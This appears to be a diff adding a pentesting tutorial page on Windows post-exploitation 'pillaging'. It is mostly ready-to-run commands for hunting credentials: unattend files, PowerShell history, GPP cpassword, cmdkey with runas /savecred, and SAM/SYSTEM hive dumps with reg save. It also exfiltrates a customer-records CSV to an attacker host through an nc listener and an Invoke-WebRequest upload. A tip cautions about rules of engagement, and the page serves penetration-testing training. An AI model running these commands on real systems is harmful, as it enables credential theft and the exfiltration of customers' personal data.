@@ -1,0 +1,228 @@
+## The Mindset
+
+Pillaging is post-exploitation with the goal of extracting value. On Windows you're hunting:
+
+- **Credentials** — saved passwords, hashes, tokens, keys, config secrets
+- **Sensitive data** — customer records, financial files, PII (the stuff that proves impact in a report)
+- **Infrastructure intel** — domain info, internal hostnames, connection strings for lateral movement
+- **Persistence material** — anything that helps you keep or regain access
+
+The difference between enumeration and pillaging is intent. Enumeration maps the system; pillaging strips it.
+
+---
+
+## Start With Automated Enumeration
+
+Before manual hunting, run an automated enumeration script. These find privilege-escalation paths and sensitive files far faster than you can by hand.
+
+### winPEAS
+
+The Windows equivalent of linPEAS — checks for service misconfigs, weak permissions, stored credentials, autostart entries, and dozens of other privesc vectors in one run.
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Run the full check (color-coded; red/yellow = high interest)
+winPEASx64.exe
+
+# Quieter, log to a file for review
+winPEASx64.exe log
+```
+
+### Other Tools
+
+| Tool            | Purpose                                                        |
+| --------------- | -------------------------------------------------------------- |
+| **winPEAS**     | All-in-one privesc enumeration                                 |
+| **PowerUp.ps1** | PowerShell privesc checks — service misconfigs, unquoted paths |
+| **SharpUp**     | C# port of PowerUp — faster, compiled                          |
+| **Seatbelt**    | Host survey — broad data collection                            |
+| **LaZagne**     | Recovers stored passwords from 100+ applications               |
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# PowerUp — run all privesc checks
+. .\PowerUp.ps1
+Invoke-AllChecks
+```
+
+<Tip>
+  Run winPEAS first to get the lay of the land, then **manually verify**
+  anything it flags before exploiting. Automated tools produce false positives,
+  and on a defended box they're noisy — know that running them may generate
+  alerts.
+</Tip>
+
+---
+
+## Hunting Sensitive Files
+
+This is the core of pillaging — finding the files that contain credentials or prove impact.
+
+### Search by Filename and Extension
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Files with sensitive-sounding names across the C: drive
+dir c:\*password* /s /b
+dir c:\*secret* /s /b
+dir c:\*credential* /s /b
+
+# Common sensitive file types
+dir c:\*.kdbx /s /b        & rem KeePass databases
+dir c:\*.config /s /b      & rem app configs (connection strings)
+dir c:\*.csv /s /b         & rem data exports — customer records, PII
+dir c:\*.bak /s /b         & rem backups
+```
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# PowerShell — find files by multiple extensions
+Get-ChildItem -Path C:\ -Include *.kdbx,*.config,*.csv,*.bak,*.xml,*.txt -Recurse -ErrorAction SilentlyContinue
+
+# Find files modified recently (fresh data, active work)
+Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue |
+  Sort-Object LastWriteTime -Descending | Select-Object -First 30 FullName, LastWriteTime
+```
+
+### Search File Contents for Credentials
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Search files recursively for credential strings
+findstr /s /i /m "password" c:\*.txt c:\*.ini c:\*.config c:\*.xml
+findstr /s /i /m "connectionstring" c:\*.config
+findstr /s /i /m "pwd=" c:\*.*
+```
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# PowerShell — grep file contents recursively
+Get-ChildItem -Path C:\ -Include *.config,*.xml,*.ini,*.txt -Recurse -ErrorAction SilentlyContinue |
+  Select-String -Pattern "password|pwd|secret|connectionstring|apikey"
+```
+
+---
+
+## Where Credentials Hide on Windows
+
+A targeted tour of the highest-value locations:
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Unattended install files — often contain plaintext admin passwords
+Get-ChildItem -Path C:\ -Include unattend.xml,sysprep.xml,unattended.xml -Recurse -ErrorAction SilentlyContinue
+# also: C:\Windows\Panther\Unattend.xml
+
+# PowerShell history — users paste credentials into commands
+Get-Content (Get-PSReadlineOption).HistorySavePath
+# default: C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+# Saved IIS / web.config connection strings
+Get-ChildItem -Path C:\inetpub -Include web.config -Recurse -ErrorAction SilentlyContinue | Select-String "connectionString"
+
+# Stored Windows credentials
+cmdkey /list
+
+# Group Policy Preferences passwords (cpassword — decryptable)
+Get-ChildItem -Path C:\ -Include Groups.xml,Services.xml,ScheduledTasks.xml -Recurse -ErrorAction SilentlyContinue
+
+# Browser-saved data, app configs, tokens
+Get-ChildItem C:\Users\*\AppData\Roaming -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem C:\Users\*\AppData\Local -Recurse -ErrorAction SilentlyContinue
+```
+
+**The highest-value credential locations:**
+
+| Location                             | What's There                                                                    |
+| ------------------------------------ | ------------------------------------------------------------------------------- |
+| `C:\Windows\Panther\Unattend.xml`    | Plaintext admin password from install                                           |
+| PowerShell `ConsoleHost_history.txt` | Commands with credentials typed in                                              |
+| `web.config` / IIS configs           | Database connection strings                                                     |
+| `cmdkey /list` + runas               | Stored credentials usable without knowing the password                          |
+| GPP XML (`cpassword`)                | AES-encrypted password with a public key — instantly decryptable                |
+| SAM/SYSTEM hives                     | Local password hashes (see [Registry](/tech/windows/registry))                  |
+| LSASS memory                         | Live credentials (see [Processes & Services](/tech/windows/processes-services)) |
+
+<Tip>
+  `cmdkey /list` shows stored credentials you may not know the password for —
+  but you can often still *use* them with `runas /savecred`, executing commands
+  as that account without ever seeing the password.
+</Tip>
+
+---
+
+## The Exfiltration Endgame
+
+Finding the data is half the job — extracting it and proving impact is the other half. Picture the classic scenario: you've landed on a box, escalated, and found `customer_database.csv` sitting in a shared folder — thousands of customer records with names, emails, and payment details.
+
+### Confirm What You've Found
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Inspect the file — confirm it's real data before exfiltrating
+Import-Csv C:\Shares\Finance\customer_database.csv | Select-Object -First 5
+(Import-Csv C:\Shares\Finance\customer_database.csv).Count   # how many records
+```
+
+### Exfiltrate It
+
+```bash theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Option 1 — pull it down via your SMB share or evil-winrm's download
+# (in evil-winrm:)  download C:\Shares\Finance\customer_database.csv
+
+# Option 2 — host a listener on Kali and push from the target
+# On Kali:
+nc -lvnp 4444 > customer_database.csv
+```
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# On the target — send the file to your listener
+# (PowerShell file transfer to your Kali web server)
+Invoke-WebRequest -Uri "http://10.10.14.1:8000/upload" -Method POST -InFile "C:\Shares\Finance\customer_database.csv"
+```
+
+### Why This Matters — Impact & Reporting
+
+This is where pentesting connects to the real world. That CSV isn't just a flag — it represents:
+
+- **PII exposure** — names, addresses, payment data. Under **GDPR**, a breach of this data can mean fines up to 4% of global annual revenue
+- **Demonstrated business impact** — "we got admin" is abstract; "we exfiltrated 40,000 customer records including payment details" is a board-level conversation
+- **The evidence that justifies the engagement** — proving real data was reachable is what drives organizations to fix things
+
+<Tip>
+  In a real engagement, **do not actually exfiltrate** sensitive PII unless your
+  rules of engagement explicitly permit it. Usually you prove access — a
+  screenshot of the first few rows, the record count, the file path and
+  permissions — without removing the data. Removing real customer data can
+  itself create legal liability. Know your ROE.
+</Tip>
+
+---
+
+## Pillaging Checklist
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+:: AUTOMATED FIRST
+winPEASx64.exe
+
+:: SENSITIVE FILES BY NAME
+dir c:\*password* c:\*secret* c:\*.kdbx c:\*.csv /s /b
+
+:: CREDENTIALS IN FILE CONTENTS
+findstr /s /i /m "password connectionstring pwd=" c:\*.config c:\*.xml c:\*.ini
+
+:: UNATTENDED INSTALL FILES
+dir c:\Windows\Panther\Unattend.xml /s /b
+
+:: STORED CREDENTIALS
+cmdkey /list
+
+:: SAM / SYSTEM HIVES (needs admin/SeBackup)
+reg save HKLM\SAM C:\Users\Public\sam.save
+reg save HKLM\SYSTEM C:\Users\Public\system.save
+```
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# POWERSHELL HISTORY
+Get-Content (Get-PSReadlineOption).HistorySavePath
+
+# APPDATA CREDENTIAL HUNT
+Get-ChildItem C:\Users\*\AppData -Recurse -ErrorAction SilentlyContinue |
+  Select-String -Pattern "password|token|apikey" -ErrorAction SilentlyContinue
+```
+
+---
+
+_Next: [Windows Security Mechanisms](/tech/windows/security-mechanisms) — UAC, AppLocker, Defender, and the defenses you'll work around._
